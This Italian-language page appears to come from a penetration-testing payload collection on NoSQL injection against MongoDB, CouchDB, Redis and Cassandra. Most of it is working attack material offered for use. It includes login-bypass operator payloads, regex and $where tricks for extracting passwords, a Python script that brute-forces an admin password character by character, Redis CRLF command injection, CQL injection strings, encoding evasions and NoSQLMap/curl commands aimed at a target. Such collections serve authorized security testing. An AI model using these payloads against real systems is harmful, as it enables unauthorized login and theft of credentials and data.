# 🍃 Payload di NoSQL injection

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](NoSQL-Injection.tr.md) • [🇬🇷 Ελληνικά](NoSQL-Injection.el.md)

> **Nota sugli esempi originali:** Gli operatori funzionano solo se il backend interpreta l’input come struttura/query nel modo mostrato; una stringa JSON non diventa automaticamente un operatore. MongoDB, CouchDB, Redis e Cassandra hanno modelli diversi. ALLOW FILTERING non aggira da solo autenticazione o autorizzazione; le funzioni JavaScript lato server dipendono dalla versione e dalla configurazione.


```
███╗   ██╗ ██████╗ ███████╗ ██████╗ ██╗         ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
████╗  ██║██╔═══██╗██╔════╝██╔═══██╗██║         ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██╔██╗ ██║██║   ██║███████╗██║   ██║██║         ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║╚██╗██║██║   ██║╚════██║██║▄▄ ██║██║         ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║ ╚████║╚██████╔╝███████║╚██████╔╝███████╗    ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝    ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## 🎯 Injection in MongoDB

### Aggiramento dell'autenticazione
```javascript
// Injection JSON
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$nin": []}, "password": {"$nin": []}}

// Con codifica URL
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```

### Operatori comuni
```javascript
$eq     // Uguale
$ne     // Diverso
$gt     // Maggiore di
$gte    // Maggiore o uguale
$lt     // Minore di
$lte    // Minore o uguale
$in     // Nell’array
$nin    // Non nell’array
$regex  // Espressione regolare
$exists // Il campo esiste
$or     // OR logico
$and    // AND logico
$where  // Espressione JavaScript
```

---

## 💉 Payload di base

### Injection nei parametri URL
```
# Aggiramento dell'autenticazione
username[$ne]=admin&password[$ne]=wrongpassword
username[$regex]=^a.*&password[$ne]=wrongpassword
username=admin&password[$ne]=wrongpassword

# Condizioni sempre vere
{"$gt": ""}
{"$ne": null}
{"$ne": ""}
{"$exists": true}
```

### Injection nel corpo JSON
```json
// Aggiramento di base
{"username": {"$ne": ""}, "password": {"$ne": ""}}

// Aggiramento con espressioni regolari
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// Condizione OR
{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}

// Maggiore di
{"username": "admin", "password": {"$gt": ""}}
```

---

## 🔥 Estrazione dei dati

### Estrazione basata su espressioni regolari
```javascript
// Estrai la password un carattere alla volta
password[$regex]=^a.*
password[$regex]=^b.*
password[$regex]=^c.*
...

// Estrai in base alla posizione
password[$regex]=^.{0}a.*   // Il primo carattere è 'a'?
password[$regex]=^.{1}b.*   // Il secondo carattere è 'b'?

// Caratteri comuni
password[$regex]=^[a-z].*   // Inizia con una minuscola
password[$regex]=^[A-Z].*   // Inizia con una maiuscola
password[$regex]=^[0-9].*   // Inizia con una cifra
```

### Script di estrazione blind booleana
```python
import requests
import string

url = "http://target/login"
charset = string.ascii_letters + string.digits + "_@!#$%"
password = ""

while True:
    found = False
    for char in charset:
        payload = {
            "username": "admin",
            "password[$regex]": f"^{password}{char}.*"
        }
        r = requests.post(url, data=payload)
        if "Login successful" in r.text:
            password += char
            print(f"Found: {password}")
            found = True
            break
    if not found:
        break

print(f"Password: {password}")
```

---

## 🚀 Payload avanzati

### Injection JavaScript con $where
```javascript
// Basata sull'attesa (blind basata sui tempi)
{"$where": "sleep(5000)"}
{"username": {"$where": "sleep(5000)"}}

// Estrazione dei dati
{"$where": "this.password.length == 8"}
{"$where": "this.password[0] == 'a'"}
{"$where": "this.password.match(/^admin/)"}

// Basata sugli errori
{"$where": "this.constructor.constructor('return this.password')()"}
```

### Injection tramite array
```json
// Operatore $in
{"username": {"$in": ["admin", "administrator", "root"]}}

// Operatore $nin
{"username": {"$nin": ["guest", "anonymous"]}}
```

### Injection di operatori
```
# Converti il campo in operatore
username=admin&password[$ne]=wrongpassword

# Operatore annidato
username[$eq]=admin&password[$regex]=^p

# Operatori multipli
username[$gt]=&username[$lt]=z&password[$ne]=
```

---

## 🍃 Injection in CouchDB

### Payload di base
```javascript
// Aggiramento dell'autenticazione
{"selector": {"username": {"$ne": ""}, "password": {"$ne": ""}}}

// Espressione regolare
{"selector": {"username": {"$regex": ".*"}}}

// Maggiore di
{"selector": {"password": {"$gt": null}}}
```

### Injection nelle view
```javascript
// Injection nelle query Mango
{"selector": {"_id": {"$gt": null}}}

// Ottieni tutti i documenti
{"selector": {"_id": {"$regex": ".*"}}}
```

---

## 🔴 Injection in Redis

### Comandi di base
```redis
# Enumerazione delle chiavi
KEYS *
SCAN 0

# Estrazione dei dati
GET key_name
HGETALL hash_name

# Imposta i dati
SET key value
HSET hash field value
```

### Command injection attraverso l'app
```
# Se l'input dell'utente viene passato ai comandi Redis
username=admin\r\nKEYS *\r\n
username=admin%0d%0aKEYS *%0d%0a
```

---

## 📊 Injection in Cassandra

### Injection CQL
```sql
-- Injection di base
' OR '1'='1
' OR ''='

-- Aggiramento con ALLOW FILTERING
SELECT * FROM users WHERE username='admin' ALLOW FILTERING

-- Injection tramite commenti
admin'--
admin'/*
```

---

## 🛡 Tecniche di aggiramento

### Codifica URL
```
$ne     →  %24ne
$gt     →  %24gt
$regex  →  %24regex
$where  →  %24where
```

### Aggiramento con Unicode
```
$ne     →  \u0024ne
$gt     →  \u0024gt
```

### Varianti della sintassi degli array
```
# Standard
password[$ne]=

# Alternativa
password[0][$ne]=
password[][$ne]=
```

### Manipolazione di Content-Type
```
# Passa da un modulo a JSON
Content-Type: application/json

{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

---

## 📝 Punti di injection

```
POST /login
- Parametri del corpo (JSON/modulo)
- Parametri della query string

GET /users?id=
- Parametri della query

Header:
- Authorization
- Valori dei cookie

Endpoint API:
- GraphQL con backend MongoDB
- Filtri delle API REST
```

---

## 🔍 Checklist di rilevamento

```markdown
□ Prova l'operatore $ne: {"field": {"$ne": ""}}
□ Prova l'operatore $gt: {"field": {"$gt": ""}}
□ Prova $regex: {"field": {"$regex": ".*"}}
□ Prova $where: {"$where": "1==1"}
□ Prova la sintassi degli array nell'URL: field[$ne]=
□ Prova gli operatori JSON
□ Verifica se i tempi di risposta cambiano
□ Verifica se le lunghezze delle risposte cambiano
□ Prova tipi di contenuto diversi
```

---

## 🔗 Strumenti

```bash
# NoSQLMap
git clone https://github.com/codingo/NoSQLMap.git
python nosqlmap.py

# Scanner per injection in MongoDB
nuclei -t nosql-injection.yaml -u http://target

# Test manuali con curl
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
```

---

## 🔗 Payload correlati

- [Payload SQLi](./SQLi.it.md)
- [Injection GraphQL](./GraphQL-Injection.it.md)

---

**Torna ai payload:** [💉 Raccolta di payload](../../README.it.md#category-18)
